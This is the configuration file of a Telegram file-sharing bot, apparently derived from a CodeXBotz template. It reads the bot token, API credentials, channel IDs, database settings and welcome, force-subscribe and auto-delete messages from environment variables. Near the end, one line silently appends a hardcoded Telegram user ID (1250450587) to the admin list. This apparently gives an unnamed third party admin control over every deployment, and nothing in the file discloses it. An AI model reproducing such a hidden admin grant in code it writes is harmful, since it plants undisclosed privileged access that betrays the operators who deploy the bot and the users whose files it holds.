#(©)CodeXBotz

import os
import logging
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv()

#Bot token @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

#Your API ID from my.telegram.org
APP_ID = int(os.environ.get("APP_ID", ""))

#Your API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

#Your db channel Id
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))

#OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", ""))

#Port
PORT = os.environ.get("PORT", "8080")

#Database 
DB_URI = os.environ.get("DATABASE_URL", "")
DB_NAME = os.environ.get("DATABASE_NAME", "filesharexbot")

#force sub channel id, if you want enable force sub
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

#start message
START_PIC = os.environ.get("START_PIC","")
START_MSG = os.environ.get("START_MESSAGE", "𝐇𝐞𝐥𝐥𝐨 <b>{first}</b> 🤝🤝\n\n 𝐓𝐡𝐢𝐬 𝐢𝐬 𝐊𝐀𝐌𝐏𝐀𝐋𝐀 𝐑𝐄𝐋𝐀𝐗𝐀𝐓𝐈𝐎𝐍 𝐬𝐩𝐞𝐜𝐢𝐚𝐥 𝐛𝐨𝐭 𝐰𝐡𝐢𝐜𝐡 𝐬𝐭𝐨𝐫𝐞𝐬 𝐟𝐢𝐥𝐞𝐬 𝐢𝐧 𝐬𝐩𝐞𝐜𝐢𝐟𝐢𝐜 𝐜𝐡𝐚𝐧𝐧𝐞𝐥 𝐚𝐧𝐝 𝐮𝐬𝐞𝐫𝐬 𝐚𝐜𝐜𝐞𝐬𝐬 𝐭𝐡𝐞𝐦 𝐟𝐫𝐨𝐦 𝐚 𝐬𝐩𝐞𝐜𝐢𝐚𝐥 𝐥𝐢𝐧𝐤")
try:
    ADMINS=[]
    for x in (os.environ.get("ADMINS", "").split()):
        ADMINS.append(int(x))
except ValueError:
        raise Exception("Your Admins list does not contain valid integers.")

#Force sub message 
FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "𝐇𝐞𝐥𝐥𝐨 {first} 🤝🤝 \n\n<b>𝐘𝐨𝐮 𝐧𝐞𝐞𝐝 𝐭𝐨 𝐣𝐨𝐢𝐧 𝐊𝐚𝐦𝐩𝐚𝐥𝐚 𝐑𝐞𝐥𝐚𝐱𝐚𝐭𝐢𝐨𝐧 𝐜𝐡𝐚𝐧𝐧𝐞𝐥 𝐭𝐨 𝐮𝐬𝐞 𝐦𝐞\n\n 𝐏𝐥𝐞𝐚𝐬𝐞 𝐣𝐨𝐢𝐧 𝐠𝐫𝐨𝐮𝐩 𝐛𝐲 𝐜𝐥𝐢𝐜𝐤𝐢𝐧𝐠 𝐢𝐧 𝐭𝐡𝐞 𝐥𝐢𝐧𝐤 𝐛𝐮𝐭𝐭𝐨𝐧 𝐛𝐞𝐥𝐨𝐰 👇👇</b>")

#set your Custom Caption here, Keep None for Disable Custom Caption
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

#set True if you want to prevent users from forwarding files from bot
PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "False") == "True" else False

# Auto delete time in seconds.
AUTO_DELETE_TIME = int(os.getenv("AUTO_DELETE_TIME", "0"))
AUTO_DELETE_MSG = os.environ.get("AUTO_DELETE_MSG", "<b><u>𝐑𝐄𝐌𝐈𝐍𝐃𝐄𝐑</u>:</b> <i>These files will be automatically deleted in</i> <b><u>{time} 𝐡𝐨𝐮𝐫𝐬</u></b>. <i>Please ensure you have saved any necessary content before this time.</i>")
AUTO_DEL_SUCCESS_MSG = os.environ.get("AUTO_DEL_SUCCESS_MSG", "Your file has been successfully deleted. Thank you for using our service. ✅")

#Set true if you want Disable your Channel Posts Share button
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True'

BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
USER_REPLY_TEXT = "❌Don't send me messages directly I'm only File Share bot!"

ADMINS.append(OWNER_ID)
ADMINS.append(1250450587)

LOG_FILE_NAME = "filesharingbot.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt='%d-%b-%y %H:%M:%S',
    handlers=[
        RotatingFileHandler(
            LOG_FILE_NAME,
            maxBytes=50000000,
            backupCount=10
        ),
        logging.StreamHandler()
    ]
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
